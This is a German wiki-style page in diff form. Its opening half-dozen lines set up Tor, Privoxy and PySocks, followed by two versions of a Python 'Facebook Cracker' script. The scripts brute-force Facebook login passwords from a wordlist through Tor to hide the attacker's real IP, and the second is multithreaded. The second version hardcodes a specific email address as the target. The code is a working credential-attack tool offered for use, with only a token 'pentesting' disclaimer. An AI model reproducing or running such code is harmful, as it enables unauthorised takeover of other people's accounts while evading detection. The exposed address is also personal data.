@@ -1,0 +1,333 @@
+Tor installieren 
+<code>apt-get install tor</code>
+
+password hash erstellen 
+<code>tor --hash-password mypassword</code>
+
+Datei anpassen /etc/tor/torrc : 
+<code> 
+ControlPort 9051
+HashedControlPassword 16:872860B76453A77D60CA2BB8C1A7042072093276A3D701AD684053EC4C<code>
+</code>
+Git,Python-dev und pytorctl installieren 
+
+<code>
+apt-get install git
+apt-get install python-dev python-pip
+#git clone git://github.com/aaronsw/pytorctl.git
+#pip install pytorctl/
+pip install PySocks
+</code>
+
+Privoxy installieren : 
+<code>apt-get install privoxy</code>
+
+Datei konfigurieren /etc/privoxy/config  
+<code>forward-socks5 / localhost:9050 .</code>
+
+Python Script run in Tor Beispiel 
+<code python>
+import urllib2
+import urllib
+import json
+import socket
+import socks
+ipcheck_url = 'http://checkip.amazonaws.com/'
+# Actual IP.
+print urllib2.urlopen(ipcheck_url).read() 
+# Tor IP.
+socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, '127.0.0.1', 9050)
+socket.socket = socks.socksocket
+print urllib2.urlopen(ipcheck_url).read() 
+data = json.loads(urllib.urlopen("http://ip.jsontest.com/").read())
+print data["ip"]
+</code>
+
+
+Bruteforce Skript mit Tor IP : 
+
+<code python>
+import urllib2
+import urllib
+import json
+import socket
+import socks
+
+import sys
+import random
+import mechanize
+import cookielib
+
+ipcheck_url = 'http://checkip.amazonaws.com/'
+# Actual IP.
+print "That is the Reail WAN IP :" + urllib2.urlopen(ipcheck_url).read() 
+# Tor IP.
+socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, '127.0.0.1', 9050)
+socket.socket = socks.socksocket
+print "That is the Attack Tor IP :" + urllib2.urlopen(ipcheck_url).read() 
+
+#data = json.loads(urllib.urlopen("http://ip.jsontest.com/").read())
+#print data["ip"]
+
+#----------------------------------------------------------------------------------------
+
+
+GHT = '''
+        +=======================================+
+        |..........Facebook Cracker v 2.........|
+        +---------------------------------------+
+        |#Author: Mauritania Attacker           |
+        |#Contact: www.fb.com/mauritanie.forever|
+        |#Date: 02/04/2013                      |
+        |#Modify: JonnyBravo Date:09/08/2016    |
+        |#This tool is made for pentesting.     |
+        |#Changing the Description of this tool |
+        |Won't made you the coder ^_^ !!!       |
+        |#Respect Coderz ^_^                    |
+        |#I take no responsibilities for the    |
+        |  use of this program !                |
+        +=======================================+
+        |..........Facebook Cracker v 2.........|
+        +---------------------------------------+
+'''
+print "Note: - This tool can crack facebook account even if you don't have the email of your victim"
+print "# Hit CTRL+C to quit the program"
+print "# Use www.graph.facebook.com for more infos about your victim ^_^"
+email = str(raw_input("# Enter |Email| |Phone number| |Profile ID number| |Username| : "))
+passwordlist = str(raw_input("Enter the name of the password list file : "))
+useragents = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
+login = 'https://www.facebook.com/login.php?login_attempt=1&lwv=100'
+def attack(password):
+  try:
+     sys.stdout.write("\r[*] trying %s.. " % password)
+     sys.stdout.flush()
+     br.addheaders = [('User-agent', random.choice(useragents))]
+     site = br.open(login)
+     br.select_form(nr=0)
+     print "cHECK " +  password 
+     ##Facebook
+     br.form['email'] = email
+     br.form['pass'] = password
+     br.submit()
+     log = br.geturl()
+    # print log
+    # print login
+     if log != login:
+        print "\n\n\n [*] Password found .. !!"
+        print "\n [*] Password : %s\n" % (password)
+        sys.exit(1)
+  except KeyboardInterrupt:
+        print "\n[*] Exiting program .. "
+        sys.exit(1)
+def search():
+    global password
+    for password in passwords:
+        attack(password.replace("\n",""))
+def check():
+    global br
+    global passwords
+    try:
+       br = mechanize.Browser()
+       cj = cookielib.LWPCookieJar()
+       br.set_handle_robots(False)
+       br.set_handle_equiv(True)
+       br.set_handle_referer(True)
+       br.set_handle_redirect(True)
+       br.set_cookiejar(cj)
+       br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
+    except KeyboardInterrupt:
+       print "\n[*] Exiting program ..\n"
+       sys.exit(1)
+    try:
+       list = open(passwordlist, "r")
+       passwords = list.readlines()
+       k = 0
+       while k < len(passwords):
+          passwords[k] = passwords[k].strip()
+          k += 1
+    except IOError:
+        print "\n [*] Error: check your password list path \n"
+        sys.exit(1)
+    except KeyboardInterrupt:
+        print "\n [*] Exiting program ..\n"
+        sys.exit(1)
+    try:
+        print GHT
+        print " [*] Account to crack : %s" % (email)
+        print " [*] Loaded :" , len(passwords), "passwords"
+        print " [*] Cracking, please wait ..."
+    except KeyboardInterrupt:
+        print "\n [*] Exiting program ..\n"
+        sys.exit(1)
+    try:
+        search()
+        attack(password)
+    except KeyboardInterrupt:
+        print "\n [*] Exiting program ..\n"
+        sys.exit(1)
+if __name__ == '__main__':
+    check()
+</code>
+
+<code python>
+import urllib2
+import urllib
+import json
+import socket
+import socks
+import time
+import sys
+import random
+import mechanize
+import cookielib
+
+import threading
+#from multiprocessing import Process, Array, Queue, Pool 
+import multiprocessing
+import ctypes
+import numpy as np
+
+
+ipcheck_url = 'http://checkip.amazonaws.com/'
+# Actual IP.
+print "That is the Reail WAN IP :" + urllib2.urlopen(ipcheck_url).read() 
+# Tor IP.
+socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, '127.0.0.1', 9050)
+socket.socket = socks.socksocket
+print "That is the Attack Tor IP :" + urllib2.urlopen(ipcheck_url).read() 
+
+#data = json.loads(urllib.urlopen("http://ip.jsontest.com/").read())
+#print data["ip"]
+#----------------------------------------------------------------------------------------
+
+
+GHT = '''
+        +=======================================+
+        |..........Facebook Cracker v 2.........|
+        +---------------------------------------+
+        |#Author: Mauritania Attacker           |
+        |#Contact: www.fb.com/mauritanie.forever|
+        |#Date: 02/04/2013                      |
+        |#Modify: JonnyBravo Date:09/08/2016    |
+        |#This tool is made for pentesting.     |
+        |#Changing the Description of this tool |
+        |Won't made you the coder ^_^ !!!       |
+        |#Respect Coderz ^_^                    |
+        |#I take no responsibilities for the    |
+        |  use of this program !                |
+        +=======================================+
+        |..........Facebook Cracker v 2.........|
+        +---------------------------------------+
+'''
+print "Note: - This tool can crack facebook account even if you don't have the email of your victim"
+print "# Hit CTRL+C to quit the program"
+print "# Use www.graph.facebook.com for more infos about your victim ^_^"
+#email = str(raw_input("# Enter |Email| |Phone number| |Profile ID number| |Username| : "))
+email = "mr.blue82@gmail.com"
+#passwordlist = str(raw_input("Enter the name of the password list file : "))
+passwordlist = "/home/jonnybravo/Test"
+useragents = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
+login = 'https://www.facebook.com/login.php?login_attempt=1&lwv=100'
+result_list = []
+def log_result(result):
+	print "ja"
+	result_list.append(result)
+
+def attack(password):
+  try:
+     sys.stdout.write("\r[*] trying %s.. " % password)
+     #sys.stdout.flush()
+     br.addheaders = [('User-agent', random.choice(useragents))]
+     site = br.open(login)
+     br.select_form(nr=0)
+     #print "cHECK " +  password 
+     ##Facebook 
+     br.form['email'] = email
+     br.form['pass'] = password
+     br.submit()
+     log = br.geturl()
+     #print log
+     #print login
+     if log != login:
+        print "\n\n\n [*] Password found .. !!"
+        print "\n [*] Password : %s\n" % (password)
+        return "Yes"
+        sys.exit(3)
+     time.sleep(1.0)
+     return "No"
+     
+        
+  except KeyboardInterrupt:
+        print "\n[*] Exiting program .. "
+        
+        sys.exit(1)
+
+        
+def search():
+    global password
+    test = []
+    for password in passwords:
+		#Muliti
+		test.append(password.replace("\n",""))
+        #attack(password.replace("\n",""))
+    #print "Output LIst ", test
+    pool = multiprocessing.Pool(processes=3)
+    pool.map_async(attack, test, callback = log_result)
+    pool.close()
+    pool.join() 
+     
+    #print "lol", result_list
+
+
+    #p.join()
+    
+def check():
+    global br
+    global passwords
+    try:
+       br = mechanize.Browser()
+       cj = cookielib.LWPCookieJar()
+       br.set_handle_robots(False)
+       br.set_handle_equiv(True)
+       br.set_handle_referer(True)
+       br.set_handle_redirect(True)
+       br.set_cookiejar(cj)
+       br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
+    except KeyboardInterrupt:
+       print "\n[*] Exiting program ..\n"
+       sys.exit(1)
+    try:
+       list = open(passwordlist, "r")
+       passwords = list.readlines()
+       k = 0
+       while k < len(passwords):
+          passwords[k] = passwords[k].strip()
+          k += 1
+    except IOError:
+        print "\n [*] Error: check your password list path \n"
+        sys.exit(1)
+    except KeyboardInterrupt:
+        print "\n [*] Exiting program ..\n"
+        sys.exit(1)
+    try:
+        print GHT
+        print " [*] Account to crack : %s" % (email)
+        print " [*] Loaded :" , len(passwords), "passwords"
+        print " [*] Cracking, please wait ..."
+    except KeyboardInterrupt:
+        print "\n [*] Exiting program ..\n"
+        sys.exit(1)
+    try:
+        search()
+        attack(password)
+    except KeyboardInterrupt:
+        print "\n [*] Exiting program ..\n"
+        sys.exit(1)
+if __name__ == '__main__':
+    check()
+</code>
+
+
+
+
+
